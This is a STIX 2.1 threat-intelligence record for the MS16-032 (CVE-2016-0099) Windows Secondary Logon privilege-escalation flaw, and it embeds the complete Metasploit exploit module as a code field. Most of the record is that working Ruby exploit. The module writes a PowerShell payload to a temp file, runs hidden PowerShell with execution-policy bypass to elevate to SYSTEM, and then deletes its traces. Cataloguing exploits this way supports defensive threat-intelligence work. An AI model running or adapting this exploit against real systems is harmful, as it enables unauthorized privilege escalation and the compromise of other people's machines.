{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e1f02734-21a0-4405-b0ed-6ade5a67ded2",
    "created": "2024-08-14T16:50:03.763571Z",
    "modified": "2024-08-14T16:50:03.763575Z",
    "name": "MS16-032 Secondary Logon Handle Privilege Escalation",
    "description": " This module exploits the lack of sanitization of standard handles in Windows' Secondary Logon Service.  The vulnerability is known to affect versions of Windows 7-10 and 2k8-2k12 32 and 64 bit.  This module will only work against those versions of Windows with Powershell 2.0 or later and systems with two or more CPU cores.  'License' => BSD_LICENSE 'Notes' => { 'Stability' => [] 'SideEffects' => [] 'Reliability' => [] ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/ms16_032_secondary_logon_handle_privesc.rb",
            "external_id": "ms16_032_secondary_logon_handle_privesc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-0099"
        },
        {
            "source_name": "reference",
            "url": "https://twitter.com/FuzzySec/status/723254004042612736"
        },
        {
            "source_name": "reference",
            "url": "https://googleprojectzero.blogspot.co.uk/2016/03/exploiting-leaked-thread-handle.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = NormalRanking\n\n  include Msf::Exploit::Powershell\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Process\n  include Msf::Post::File\n  include Msf::Post::Windows::ReflectiveDLLInjection\n  include Msf::Post::Windows::Powershell\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'MS16-032 Secondary Logon Handle Privilege Escalation',\n        'Description' => %q{\n          This module exploits the lack of sanitization of standard handles in Windows' Secondary\n          Logon Service.  The vulnerability is known to affect versions of Windows 7-10 and 2k8-2k12\n          32 and 64 bit.  This module will only work against those versions of Windows with\n          Powershell 2.0 or later and systems with two or more CPU cores.\n        },\n        'License' => BSD_LICENSE,\n        'Notes' => {\n          'Stability' => [],\n          'SideEffects' => [],\n          'Reliability' => []\n        },\n        'Author' => [\n          'James Forshaw', # twitter.com/tiraniddo\n          'b33f', # @FuzzySec, http://www.fuzzysecurity.com'\n          'khr0x40sh'\n        ],\n        'References' => [\n          [ 'MSB', 'MS16-032'],\n          [ 'CVE', '2016-0099'],\n          [ 'URL', 'https://twitter.com/FuzzySec/status/723254004042612736' ],\n          [ 'URL', 'https://googleprojectzero.blogspot.co.uk/2016/03/exploiting-leaked-thread-handle.html']\n        ],\n        'DefaultOptions' => {\n          'WfsDelay' => 30,\n          'EXITFUNC' => 'thread'\n        },\n        'DisclosureDate' => '2016-03-21',\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Targets' => [\n          # Tested on (32 bits):\n          # * Windows 7 SP1\n          [ 'Windows x86', { 'Arch' => ARCH_X86 } ],\n          # Tested on (64 bits):\n          # * Windows 7 SP1\n          # * Windows 8\n          # * Windows 2012\n          [ 'Windows x64', { 'Arch' => ARCH_X64 } ]\n        ],\n        'DefaultTarget' => 0,\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              core_channel_eof\n              core_channel_open\n              core_channel_read\n              core_channel_write\n              stdapi_sys_process_execute\n            ]\n          }\n        }\n      )\n    )\n\n    register_advanced_options(\n      [\n        OptString.new('W_PATH', [false, 'Where to write temporary powershell file', nil]),\n      ]\n    )\n  end\n\n  def check\n    unless session.platform == 'windows'\n      # Non-Windows systems are definitely not affected.\n      return Exploit::CheckCode::Safe\n    end\n\n    res = psh_exec 'if($([System.Environment]::ProcessorCount) -gt 1) { echo(\"true\") }'\n    unless res.include? 'true'\n      vprint_error 'Target system has an insufficient number of processor cores'\n      return Exploit::CheckCode::Safe\n    end\n\n    Exploit::CheckCode::Detected\n  end\n\n  def exploit\n    if is_system?\n      fail_with(Failure::None, 'Session is already elevated')\n    end\n\n    if check == Exploit::CheckCode::Safe\n      fail_with(Failure::NotVulnerable, 'Target is not vulnerable')\n    end\n\n    # Exploit PoC from 'b33f'\n    ps_path = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2016-0099', 'cve_2016_0099.ps1')\n    vprint_status(\"PS1 loaded from #{ps_path}\")\n    ms16_032 = File.read(ps_path, mode: 'rb')\n\n    cmdstr = expand_path('%windir%') << '\\\\System32\\\\windowspowershell\\\\v1.0\\\\powershell.exe'\n\n    payload_arch = framework.payloads.create(datastore['PAYLOAD']).arch.first\n\n    if sysinfo['Architecture'] == ARCH_X64 && payload_arch == ARCH_X86\n      cmdstr.gsub!('System32', 'SYSWOW64')\n      print_warning('Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell')\n      vprint_warning(cmdstr.to_s)\n    end\n\n    template_path = Rex::Powershell::Templates::TEMPLATE_DIR\n    psh_payload = Rex::Powershell::Payload.to_win32pe_psh_reflection(template_path, payload.encoded)\n\n    psh_payload = compress_script(psh_payload)\n\n    @upfile = Rex::Text.rand_text_alpha(rand(6..13)) + '.ps1'\n    path = datastore['W_PATH'] || expand_path('%TEMP%')\n    @upfile = \"#{path}\\\\#{@upfile}\"\n    fd = session.fs.file.new(@upfile, 'wb')\n    print_status(\"Writing payload file, #{@upfile}...\")\n    fd.write(psh_payload)\n    fd.close\n    psh_cmd = \" -exec Bypass -nonI -window Hidden #{@upfile}\"\n\n    # lpAppName\n    ms16_032.gsub!('$cmd', \"\\\"#{cmdstr}\\\"\")\n    # lpcommandLine - capped at 1024b\n    ms16_032.gsub!('$args1', \"\\\"#{psh_cmd}\\\"\")\n    end_flag = Rex::Text.rand_text_alphanumeric(32)\n    ms16_032.gsub!('$end', end_flag)\n\n    print_status('Compressing script contents...')\n    ms16_032_c = compress_script(ms16_032)\n\n    if ms16_032_c.size > 8100\n      print_error(\"Compressed size: #{ms16_032_c.size}\")\n      error_msg = 'Compressed size may cause command to exceed '\n      error_msg += \"cmd.exe's 8kB character limit.\"\n      print_error(error_msg)\n    else\n      print_good(\"Compressed size: #{ms16_032_c.size}\")\n    end\n\n    print_status('Executing exploit script...')\n\n    cmd = expand_path('%windir%')\n    if sysinfo['Architecture'] == ARCH_X64 && session.arch == ARCH_X86\n      cmd += '\\\\Sysnative'\n    else\n      cmd += '\\\\System32'\n    end\n\n    cmd += \"\\\\windowspowershell\\\\v1.0\\\\powershell.exe -exec Bypass -nonI -window Hidden \\\"#{ms16_032_c}\\\"\"\n\n    args = nil\n\n    begin\n      r = session.sys.process.execute(cmd, args, {\n        'Hidden' => true,\n        'Channelized' => true\n      })\n\n      while (d = r.channel.read)\n        print(d)\n        break if d.include? end_flag\n      end\n      r.channel.close\n      r.close\n\n      print_good('Executed on target machine.')\n    rescue StandardError\n      print_error('An error occurred executing the script.')\n    end\n  end\n\n  def cleanup\n    rm_f(@upfile)\n    print_good(\"Deleted #{@upfile}\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-03-21",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}